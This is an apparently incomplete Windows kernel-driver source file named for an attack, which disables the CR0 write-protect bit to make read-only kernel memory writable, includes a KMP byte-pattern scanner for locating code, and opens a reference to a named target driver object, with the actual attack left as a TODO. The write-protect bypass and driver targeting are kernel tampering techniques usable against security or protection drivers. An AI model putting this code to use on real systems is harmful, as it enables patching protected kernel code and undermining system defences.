#include "Attack.h"

VOID WriteEnable()
{
	UINT64 cr0 = __readcr0();
	cr0 &= 0xfffffffffffeffff;
	__writecr0(cr0);
	_disable();
}
VOID WriteDisable()
{
	UINT64 cr0 = __readcr0();
	cr0 |= 0x10000;
	_enable();
	__writecr0(cr0);
}


VOID cal_next(PCHAR str, PLONG_PTR next, LONG_PTR len)
{
	next[0] = -1;
	LONG_PTR k = -1;
	for (LONG_PTR q = 1; q < len; q++)
	{
		while (k > -1 && str[k + 1] != str[q])
			k = next[k];
		if (str[k + 1] == str[q])    ++k;
		next[q] = k;
	}
}


PVOID KMP(PVOID str, LONG_PTR slen, PVOID ptr, LONG_PTR plen)
{
	//int* next = new int[plen];
	PLONG_PTR next = (PLONG_PTR)ExAllocatePool(NonPagedPool, plen * sizeof(LONG_PTR));
	if (!next)
	{
		return NULL;
	}
	cal_next((PCHAR)ptr, next, plen);
	LONG_PTR j = -1;
	for (LONG_PTR i = 0; i < slen; i++)
	{
		while (j > -1 && ((PCHAR)ptr)[j + 1] != ((PCHAR)str)[i]) {
			j = next[j];
		}
		if (((PCHAR)ptr)[j + 1] == ((PCHAR)str)[i])
			j = j + 1;
		if (j == plen - 1)
		{
			ExFreePool(next);
			return (PCHAR)str + i - plen + 1;
		}
			
	}
	ExFreePool(next);
	return NULL;
}




NTSTATUS AttackDemoDriver()
{
	UNICODE_STRING targetDrvName;
	RtlInitUnicodeString(&targetDrvName, TARGET_DRV_NAME);
	NTSTATUS status = STATUS_UNSUCCESSFUL;

	//start reference
	PDRIVER_OBJECT pTargetDriverObj = NULL;
	status = ObReferenceObjectByName(&targetDrvName,
		OBJ_CASE_INSENSITIVE,
		NULL, FILE_ALL_ACCESS,
		*IoDriverObjectType,
		KernelMode, NULL,
		(PVOID*)&pTargetDriverObj);

	if (!NT_SUCCESS(status))
	{
		MyPrint(_TitleAndFunc"Reference Faild :%X\n", status);
		return status;
	}

	//TODO:attack and dereference
}